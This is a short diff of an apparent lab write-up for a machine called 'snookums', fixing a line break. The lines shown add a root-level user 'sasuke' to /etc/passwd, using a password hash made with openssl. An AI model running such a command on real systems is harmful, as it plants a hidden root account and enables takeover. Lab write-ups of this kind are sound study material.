@@ -411,7 +411,7 @@ I got michael’s shell.
 ```bash
 [root@snookums ~]# openssl passwd hello
 4eDdB38csmWpI
-[root@snookums ~]# echo 'sasuke:4eDdB38csmWpI:0:0:root:/root:/bin/bash' >> /etc/passwdI switched the user “sasuke” with password hello, and I got the shell.
+[root@snookums ~]# echo 'sasuke:4eDdB38csmWpI:0:0:root:/root:/bin/bash' >> /etc/passwd
 ```
 
 ![Screenshot 2023-10-18 at 19.27.43.png](snookums%20d2e709fcc8c44a989ed6778cc9de179d/Screenshot_2023-10-18_at_19.27.43.png)
